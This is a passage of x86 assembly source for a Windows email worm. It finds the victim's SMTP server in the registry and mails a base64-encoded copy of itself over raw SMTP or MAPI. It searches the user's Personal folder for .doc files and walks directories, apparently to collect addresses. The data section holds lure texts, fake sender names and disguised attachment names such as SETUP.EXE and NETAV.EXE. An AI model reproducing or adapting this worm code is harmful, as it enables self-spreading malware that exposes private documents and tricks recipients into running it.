	call    	SendSocket					; 3° Write '>',CRLF

	call    	GetServeurReply                 	; Ok
	jc		Error_CloseSocket&CleanUp       	; No

SendDataCmd:
	mov		esi,offset cmd_data             	; 'DATA',CRLF
	push    	6                               	; Size
	pop		ecx                             	; Size
	call    	SendSocket					; send DATA command
	call    	GetServeurReply                 	; Ok
	jc		Error_CloseSocket&CleanUp       	; No

SendeMailBody:
	mov		esi, dword ptr[MemMessageBody1] 	; Start Message Body
	mov		ecx, dword ptr[MessageSize1]
	call    	SendSocket               

      mov     	esi,dword ptr [MemEncoded]		; Encoded File
      mov     	ecx,dword ptr [EncodedFileSize]
	call    	SendSocket       

	mov		esi, offset MessageBody2        	; End Message Body
	mov		ecx, MessageSize2
	call    	SendSocket                     

SendTermCmd:
	mov		esi,offset cmd_term             	; CRLF,'.',CRLF
	push    	5                               	; size
	pop		ecx                             	; size
	call    	SendSocket					; send message header+body
	call    	GetServeurReply                 	; Ok ?
	jc		Error_CloseSocket&CleanUp       	; No

SendQuitCmd:
	mov		esi,offset cmd_quit             	; 'QUIT',CRLF
	push    	6                               	; size
	pop		ecx                             	; size
	call    	SendSocket					; send QUIT command
	popad
      clc
	ret

SendSocket:
	push   	0                               	; Flags
	push    	ecx                             	; size
	push    	esi                             	; Source
	push    	[hSocket]                       	; Handle
	api     	send
	ret


;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;........................ Minor Sub Routine ..................................
;............................ Z O N E ........................................
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


;........................ Open & Map a File ..................................
;.............................................................................


; IN:			TempPath&Name = Path + Name of file to Open
; OUT:		fhandle, maphandle, mapaddress
;			cf = 0 ou 1

Open&MapFile:
      xor     	eax,eax
      push    	eax
      push    	FILE_ATTRIBUTE_NORMAL
      push    	OPEN_EXISTING
      push    	eax
      push    	FILE_SHARE_READ
      push    	GENERIC_READ or GENERIC_WRITE		
      push    	Offset TempPath&Name
      api     	CreateFileA
      inc     	eax
      je      	Open&MapFileError
      dec     	eax
      mov     	dword ptr [fhandle], eax

      xor     	eax,eax
      push    	eax
      push    	eax
      push    	eax                             
      push    	PAGE_READWRITE	            	
      push    	eax
      push    	dword ptr [fhandle]
      api     	CreateFileMappingA
      or      	eax,eax                       
      jz      	Open&MapFileCloseFileHandle
      mov     	dword ptr [maphandle],eax

      xor     	ebx,ebx
      push    	ebx                             
      push    	ebx
      push    	ebx
      push    	FILE_MAP_WRITE				
      push    	eax
      api     	MapViewOfFile
      or      	eax,eax                         	
      jz      	Open&MapFileCloseMapHandle
      mov     	dword ptr [mapaddress], eax	
	clc
	ret								

Open&MapFileUnmapView:  
      push    	dword ptr [mapaddress]          	
      api     	UnmapViewOfFile

Open&MapFileCloseMapHandle: 
      push    	dword ptr [maphandle]           	
      api     	CloseHandle

Open&MapFileCloseFileHandle: 
      push    	dword ptr [fhandle]            	
      api     	CloseHandle     
Open&MapFileError:
	stc
	ret

;...................... Search Personal Documents ............................
;.............................................................................

; OUT			- Personal Doc Path in Mem in $ [PersoDocListe]

PersonalDocSearch:
      xor     	eax,eax
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	PersoFileSize
	push    	eax                             	; System decide where 
	api     	VirtualAlloc
	test		eax, eax
	je		PersonalDocSearchError
      mov     	dword ptr[PersoDocListe], eax

      call    	Clear_TempPath&Name     
        
	push    	00h
	push    	05h						; Personal Path	      
	push    	offset TempPath&Name
	push    	00h
	api		SHGetSpecialFolderPathA

	push    	offset TempPath&Name
	api     	SetCurrentDirectoryA			; Selected dir = Personal Path

	lea		eax, FindPersonalFile
	mov		dword ptr[RoutineToCall], eax
	call    	AllSubDirSearch				; Action = FindPersonalFile
PersonalDocSearchError:
	ret	  

;.............. Search Personal File

FindPersonalFile:       
	cmp		dword ptr[NbPersonalFound], NbPersoWanted  ; Enought Perso File
	je		NoMorePersonalFile
           
	push    	offset search
      @pushsz 	"*.doc"                        
      api     	FindFirstFileA

      mov     	dword ptr [PersonalSearchHandle], eax
      inc     	eax
      jz		NoMorePersonalFile

PersonalDocumentFound:
	mov		edi, dword ptr[PersoDocListe]
	mov		edx, dword ptr[NbPersonalFound]
	rol		edx, 8
	add		edi, edx					; Right Pos

	push		edi
	push		260
	api		GetCurrentDirectoryA			; The dir

	@pushsz	'\'
	push		edi
	api		lstrcat					; The \

	push		offset [search.FileName]
	push		edi
	api		lstrcat					; The Name

	inc		dword ptr[NbPersonalFound]		; Next One
	cmp		dword ptr[NbPersonalFound], NbPersoWanted  ; Enought Perso File
	je		EnoughtPerso

FindPersonalFileNext:
	push    	offset search
	push		dword ptr [PersonalSearchHandle]
	api		FindNextFileA
	
	test		eax, eax
	jnz		PersonalDocumentFound

EnoughtPerso:
	push		dword ptr [PersonalSearchHandle]
	api		FindClose

NoMorePersonalFile:  
	ret

;.............. Search in all Sub Dir + Action in ............................

; IN:			- Root dir Selected for the Search begin
;			- RoutineToCall = SeekHtmlCurrentDir
; OUT: 		- What perform RoutineToCall in all subdir of selected Root


AllSubDirSearch:
	xor     	ebx,ebx                         	

FindFirstDir:
      lea    	edi, search                    
	push    	edi
      @pushsz 	"*.*"                        
      api     	FindFirstFileA

      mov     	dword ptr [RecSearchHandle],eax 	

      inc     	eax
      jz      	FirstDirNotFound

DirTravel:
      bt      	word ptr[search.FileAttributes],4 	
      jnc     	FindNextDir                     
                                                
      lea     	eax,[search.FileName]

	cmp     	byte ptr [eax],"."              	
      jz      	FindNextDir                   

      push    	eax                             	
      api     	SetCurrentDirectoryA

InNewDir_Action:
	pushad
	call    	dword ptr[RoutineToCall]		; THE Action    
	popad

	push    	dword ptr [RecSearchHandle]     	
	inc     	ebx                             
	jmp     	FindFirstDir
FindNextDir:
	push    	edi                             	
	push    	dword ptr [RecSearchHandle]
      api     	FindNextFileA

      or      	eax,eax                         	
      jnz     	DirTravel                       	

FirstDirNotFound:
      @pushsz 	".."                            	
      api     	SetCurrentDirectoryA            

	or      	ebx,ebx                         	
      jz      	AllSubDirSearchEnd              	
	
	dec     	ebx                             	
	pop     	dword ptr [RecSearchHandle]
	jmp     	FindNextDir

NextDirNotFound:
      push    	dword ptr [RecSearchHandle]          
      api     	FindClose
	jmp     	FirstDirNotFound

AllSubDirSearchEnd:
	ret

;.......................... Random Number ....................................

; IN:   		Edi
; OUT:  		Random Number in EDX: 0 <-> Edi-1

GetRndNumber:
      push    	eax ebx ecx esi esp ebp
        
      mov     	eax, dword ptr[RandomNb]
      mov     	ecx,41C64E6Dh
      mul     	ecx
      add     	eax,00003039h
      mov     	dword ptr[RandomNb], eax
                      
      xor     	edx, edx
      div     	edi                             	; Reste < Edi in EDX
               
      pop     	ebp esp esi ecx ebx eax          
      ret

;......................... Free The Mem ......................................

FreeTheMem:
	mov		ecx, dword ptr[EmailList]
	jecxz		FreeTheMemNext1
	call		MemFreeIt

FreeTheMemNext1:
	mov		ecx, dword ptr[MemMessageBody1]
	jecxz		FreeTheMemNext2
	call		MemFreeIt

FreeTheMemNext2:
	mov		ecx, dword ptr[PersoDocListe]
	jecxz		FreeTheMemFin
	call		MemFreeIt

FreeTheMemFin:
	ret

MemFreeIt:
	push		00008000h					; MEM_RELEASE
	push		0
	push		ecx
	api		VirtualFree
	ret

;..................... Clear TempPath & Name .................................

Clear_TempPath&Name:
       xor     	al,al
       mov     	ecx,260
       lea     	edi,TempPath&Name                	; Clear the path
       rep     	stosb
       ret

;..................... Encode File Base 64 ...................................

; IN:   		Path of the file in offset MyPath
; OUT:		Encoded file in Mem

CodeB64File:

OpenFileToEncode:
      xor     	eax,eax
      push    	eax
      push    	FILE_ATTRIBUTE_NORMAL
      push    	OPEN_EXISTING
      push    	eax
      push    	FILE_SHARE_READ
      push    	GENERIC_READ
      push    	Offset MyPath				; The file to encode
      api     	CreateFileA
      inc     	eax
      je      	CodeB64FileEnd
      dec     	eax
      mov     	dword ptr [TempFileHandle], eax

GetFileToEncodeSize:
	push		0
	push		eax
	api		GetFileSize	
	inc		eax
      je      	CodeB64FileEnd
	dec		eax
	mov		dword ptr [OurSizeToEncode], eax

	add		eax, 1000					; Security

GetMemToReadFileToEncode:
      xor     	ebx,ebx
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	eax
	push    	ebx                             	; System decide where 
	api     	VirtualAlloc
	test		eax, eax
	je		CodeB64FileEnd
	mov		dword ptr[MemToEncode], eax

ReadFileToEncode:
	push    	00h
	push    	offset ByteReaded
      push    	dword ptr [OurSizeToEncode]
      push    	eax
      push    	dword ptr [TempFileHandle]
      api		ReadFile
	
	push		dword ptr [TempFileHandle]
	api		CloseHandle

GetMemToEncodeFile:
	mov		eax, dword ptr [OurSizeToEncode]
	rol		eax, 4					; We need ori size *3 (+security)
	xor     	ebx,ebx
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	eax
	push    	ebx                             	; System decide where 
	api     	VirtualAlloc
	test		eax, eax
	je		CodeB64FileEnd
	mov		dword ptr[MemEncoded], eax

AlignFileToEncodeSize:
	mov		eax, dword ptr [OurSizeToEncode]
      push    	3
      pop     	ecx
      xor     	edx,edx                        
      push    	eax
      div     	ecx
      pop     	eax
      sub     	ecx,edx
      add     	eax,ecx					; align size to 3

EncodeFileNow:
      xchg    	eax,ecx
      mov     	edx,dword ptr [MemEncoded]
      mov     	eax,dword ptr [MemToEncode]
      call    	encodeBase64

      mov     	dword ptr [EncodedFileSize],ecx
	
CodeB64FileEnd:
	ret


;................... Encode Base 64 Algorithme ...............................

encodeBase64:							; By Bumblebee
; input:
;       		EAX = Address of data to encode
;       		EDX = Address to put encoded data
;       		ECX = Size of data to encode
; output:
;       		ECX = size of encoded data
;
      xor     	esi,esi
      call    	over_enc_table
      db      	"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
      db      	"abcdefghijklmnopqrstuvwxyz"
      db      	"0123456789+/"
over_enc_table:
      pop     	edi
      push    	ebp
      xor     	ebp,ebp
baseLoop:
      movzx   	ebx,byte ptr [eax]
      shr     	bl,2
      and     	bl,00111111b
      mov     	bh,byte ptr [edi+ebx]
      mov     	byte ptr [edx+esi],bh
      inc     	esi

      mov     	bx,word ptr [eax]
      xchg    	bl,bh
      shr     	bx,4
      mov     	bh,0
      and     	bl,00111111b
      mov     	bh,byte ptr [edi+ebx]
      mov     	byte ptr [edx+esi],bh
      inc     	esi

      inc     	eax
      mov     	bx,word ptr [eax]
      xchg    	bl,bh
      shr     	bx,6
      xor     	bh,bh
      and     	bl,00111111b
      mov     	bh,byte ptr [edi+ebx]
      mov     	byte ptr [edx+esi],bh
      inc     	esi

      inc     	eax
      xor     	ebx,ebx
      movzx   	ebx,byte ptr [eax]
      and     	bl,00111111b
      mov     	bh,byte ptr [edi+ebx]
      mov     	byte ptr [edx+esi],bh
      inc     	esi
      inc     	eax

      inc     	ebp
      cmp     	ebp,24
      jna     	DontAddEndOfLine

      xor     	ebp,ebp                         
      mov     	word ptr [edx+esi],0A0Dh
      inc     	esi
      inc     	esi
      test    	al,00h                          
      org     	$-1
DontAddEndOfLine:
      inc     	ebp
      sub     	ecx,3
      or      	ecx,ecx
      jne     	baseLoop

      mov     	ecx,esi
      add    	edx,esi
      pop     	ebp
      ret

;-----------------------------------------------------------------------------
;------------------------------ Data Zone ------------------------------------
;-----------------------------------------------------------------------------

.data


;-------------------------- Variables Zone -----------------------------------

SmtpFlag        	db  	0		; Select Mapi or Smtp
PayloadFlag		db	0		; Payload = 1
UserEmailFoundFlag db	0		; found = 1

;...................... Encode B64 Variables

EncodedFileSize	dd	0
MemEncoded		dd	0
MemToEncode		dd	0
OurSizeToEncode	dd	0
ByteReaded        dd    0

;...................... Email SMTP Variables

Reg               dd    1 			; String 
KeySize           dd    0 			; Size to read with SHGetValue 
                                  		; (init it + return effectiv lenght read in)

AccountKey        db    'Software\Microsoft\Internet Account Manager\Accounts\'
AccountSubKey     db    64 dup (0)

SmtpServeur       db	64 dup (0)   	; smtp server found with regkey


wsocket 	      dw	2	      	; sin_family ever AF_INET
		      dw	?             	; the port
ServeurIP	      dd	?	      	; addr of server node
			db	8 dup (?)     	; not used 


hSocket           dd    0               	; Socket Handle   

ServeurReply	dd	?			; error code
ServeurReplyEnd	db	?			; byte for LF


CRLF              equ   <13,10>
	
cmd_helo	      db	'HELO Support',CRLF
cmd_mailfrom	db	'MAIL FROM:<'
cmd_rcptto	      db	'RCPT TO:<'

cmd_data	      db	'DATA',CRLF
cmd_term	      db	CRLF,'.',CRLF
cmd_quit	      db	'QUIT',CRLF


MemMessageBody1	dd	0			; Ptr on Mem where built header
MessageSize1    	dd	0			; Size Header + bordel Mime

MessageBody1:	db	'Mime-Version: 1.0',CRLF
			db	'Content-Type: multipart/mixed; boundary="--123"',CRLF,CRLF

			db	'----123',CRLF
			db	'Content-Type: text/plain; charset=us-ascii',CRLF
			db	'Content-Transfer-Encoding: 7bit',CRLF,CRLF,0

			;	Text part

MessageBody1b:	db	'----123',CRLF
                	db      'Content-Type: application/octet-stream; name=',0 ; filename part
MessageBody1c:  	db      'Content-Transfer-Encoding: base64',CRLF
                	db      'Content-Disposition: attachment; filename=',0    ; filename part

			;	Encoded part

MessageBody2:	db	10,'--123--',CRLF
MessageSize2    	equ  	$-MessageBody2


RndFileName1	db	'"SETUP.EXE"',0
RndFileName2	db	'"HGAME.EXE"',0
RndFileName3	db	'"MININET.EXE"',0
RndFileName4	db	'"NETAV.EXE"',0
RndFileNameTb	dd	offset RndFileName1, offset RndFileName4, offset RndFileName3
			dd	offset RndFileName4, offset RndFileName2
NbRndFileName	equ	($-offset RndFileNameTb)/4 

RndText1:		db	'Hi ',CRLF
			db	'Here is what you asked, bye. ',CRLF,0
RndText2:		db	'Hello ',CRLF
			db	'Maybe you could help me with this, bye. ',CRLF,0
RndText3:		db	'Hello ',CRLF
			db	'Now you can try it, bye. ',CRLF,0

RndTextTb		dd	offset RndText1, offset RndText2, offset RndText3
NbRndText		equ	($-offset RndTextTb)/4

RndSubject1		db	'Hello',0
RndSubject2		db	'For you',0
RndSubject3		db	'Try it',0
RndSubject4		db	'Re:',0
RndSubjectTb:	dd	offset RndSubject2, offset RndSubject1, offset RndSubject4	
			dd	offset RndSubject3, offset RndSubject4
NbSubject		equ	($-offset RndSubjectTb)/4

RndFromName1	db	'morgan',0
RndFromName2	db	'mick',0
RndFromName3	db	'carla',0
RndFromName4	db	'eva',0
RndFromNameTb:	dd	offset RndFromName1, offset RndFromName2, offset RndFromName3
			dd	offset RndFromName4	
NbFromName		equ	($-offset RndFromNameTb)/4
				
RndFromServ1	db	'@caramail.com',0
RndFromServ2	db	'@hotmail.com',0
RndFromServ3	db	'@aol.com',0
RndFromServTb:	dd	offset RndFromServ1, offset RndFromServ2, offset RndFromServ3
NbFromServ		equ	($-offset RndFromServTb)/4


;...................... Email MAPI Variables

IConnectedStateTemp     dd      0         ; For InternetConnectedState

MapiMessage       equ   $
                  dd    ?
                  dd    offset subject
                  dd    offset textmail
                  dd    ?
                  dd    offset date
                  dd    ?
                  dd    2
                  dd    offset MsgFrom
                  dd    1
                  dd    offset MsgTo
                  dd    1
                  dd    offset MapiFileDesc

MsgFrom           equ   $
                  dd    ?
                  dd    ?
                  dd    offset namefrom
                  dd    offset mailfrom
                  dd    ?
                  dd    ?

MsgTo             equ   $
                  dd    ?
                  dd    1
                  dd    offset nameto
                  dd    offset CurrentEmail
                  dd    ?
                  dd    ?

MapiFileDesc      equ   $
                  dd    ?
                  dd    ?
                  dd    ?
                  dd    offset MyPath   ; File to attache
                  dd    ?
                  dd    ?

CurrentEmail      db    EmailSize dup (0)
MAPISession       dd    0

subject           db    'Hello',0

date              db    '',0

namefrom          db    '',0

mailfrom          db    EmailSize dup (0)

nameto            db    '',0

textmail          db    'Hi ',CRLF
                  db    'Here is what you asked, bye... ',0


;...................... Residency + Dump Variables

MutexHdl          dd  	0
MyPath            db    260 dup (0)
TempFileHandle    dd    0
ByteWritten       dd    0

;...................... Email Search Variables

NbEmailFound      dd    0       		; Compte combien d'email found
EmailList         dd    0       		; Ptr zone Mem ou stocker Emails 
                                                            
TempPath&Name     db    260 dup (0)

fhandle           dd    0       		; To find & map file
mapaddress        dd    0
maphandle         dd    0                

maphandlemail     dd    0       		; for html found         
esi_save          dd    0
EmailCurrentPos   dd    0

RandomNb          dd    0       		; Init with GettickCount

NbWabEmail        dd    0       		; Nb emails in *.Wab

;...................... Recursive Search Variables

RecSearchHandle 	dd 	0			; For the Recursive search
RoutineToCall	dd	0			; Ptr on routine to execute in all SubDir

PersonalSearchHandle	dd	0		; For personal doc search
NbPersonalFound	dd	0			; Nb Personal doc found
PersoDocListe	dd	0			; Ptr zone Mem ou stocker Path Doc Perso 

;--------------------------- Structures Zone ---------------------------------

;...................... Search File Structure

filetim         	struct
FT_dwLowDateT     dd      ?
FT_dwHighDateT    dd      ?
filetim         	ends

w32fd           struct
FileAttributes    dd      ?
CreationTime      filetim ?
LastAccessTime    filetim ?
LastWriteTime     filetim ?
FileSizeHigh      dd      ?
FileSizeLow       dd      ?
Reserved0         dd      ?
Reserved1         dd      ?
FileName          db      260 dup (0)
AlternateFileN    db      13 dup (?)
                  db      3 dup (?)
w32fd           	ends

search            w32fd   ?

;...................... System Time Structure

SystemTimeData    equ   $ 
STDYear           dw    ?
STDMonth          dw    ?
STDDayOfWeek      dw    ?
STDDay            dw    ?
STDHour           dw    ?
STDMinute         dw    ?
STDSecond         dw    ?
STDMilliseconds   dw   	?

;...................... Sockets Structure

WSAData           equ   $      
            	dw	?
			dw	?
			db	257 dup (?)
			db	129 dup (?)
			dw	?
			dw	?
			dd	?


end Mv

